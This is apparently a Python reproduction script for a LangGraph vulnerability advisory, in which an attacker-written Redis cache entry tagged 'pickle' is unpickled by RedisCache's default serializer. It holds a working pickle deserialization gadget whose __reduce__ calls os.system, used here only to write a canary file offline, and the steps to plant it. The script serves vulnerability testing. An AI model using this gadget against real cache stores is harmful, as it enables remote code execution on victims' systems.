"""Reproduce GHSA-mhr3-j7m5-c7c9 (CVE-2026-27794): LangGraph BaseCache unpickles cache entries.

Threat model (untrusted-data-store): an attacker who can write the cache backend plants a
cache entry. The victim app loads it with a library cache (RedisCache, whose serde is the
BaseCache default). On the vuln SHA that default is JsonPlusSerializer(pickle_fallback=True),
so an entry tagged "pickle" is unpickled on read -> code execution. The fix flips the default to
pickle_fallback=False, so the "pickle" entry is rejected (NotImplementedError) and skipped.

The cache backend is a loopback redis-server started inside this container (no egress; the harness
runs us with --network none). The ATTACKER writes raw bytes directly into redis in RedisCache's
own wire format ("<encoding>:<data>"), independent of the victim's serde setting, so the only thing
that differs between the vuln and fix images is the victim's deserializer. The VICTIM then builds a
fresh RedisCache (library class, default serde) and calls .get(); that is the sink.
"""
import json
import os
import pickle
import socket
import subprocess
import sys
import time

import redis

arm, nonce = sys.argv[1], sys.argv[2]
spec = json.loads(open(f"/case/inputs/{arm}.json", encoding="utf-8").read().replace("{{NONCE}}", nonce))

# Start the cache backend: a loopback redis the attacker can write and the victim reads.
subprocess.Popen(
    ["redis-server", "--port", "6379", "--bind", "127.0.0.1", "--save", "", "--appendonly", "no", "--dir", "/tmp"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
)
for _ in range(100):
    try:
        socket.create_connection(("127.0.0.1", 6379), 1).close()
        break
    except OSError:
        time.sleep(0.1)

NS = ("agent", "node_cache")
KEY = "step-result"
PREFIX = "langgraph:cache:"
redis_key = f"{PREFIX}{':'.join(NS)}:{KEY}"  # RedisCache._make_key(NS, KEY)

client = redis.Redis(host="127.0.0.1", port=6379)

# --- attacker: plant the stored entry in RedisCache wire format "<encoding>:<data>" ---
if spec["kind"] == "pickle":
    # A gadget whose unpickling runs an OS command carrying the per-trial nonce.
    class _Evil:
        def __reduce__(self):
            return (os.system, (f"printf %s {nonce} > /tmp/avb_canary",))
    raw = b"pickle:" + pickle.dumps(_Evil())
else:  # benign control: a normal msgpack-encoded value (the way RedisCache.set would store it)
    from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer
    enc, data = JsonPlusSerializer().dumps_typed({"status": "ok", "note": nonce})
    raw = f"{enc}:".encode() + data
client.set(redis_key, raw)
print("attacker planted", len(raw), "bytes under", redis_key, "encoding", raw.split(b":", 1)[0].decode())

# --- victim: a fresh library cache (default BaseCache serde) loads the entry ---
from langgraph.cache.redis import RedisCache

cache = RedisCache(redis.Redis(host="127.0.0.1", port=6379))
print("victim serde pickle_fallback =", getattr(cache.serde, "pickle_fallback", "n/a"))
result = cache.get([(NS, KEY)])
print("victim cache.get ->", repr(result)[:200])
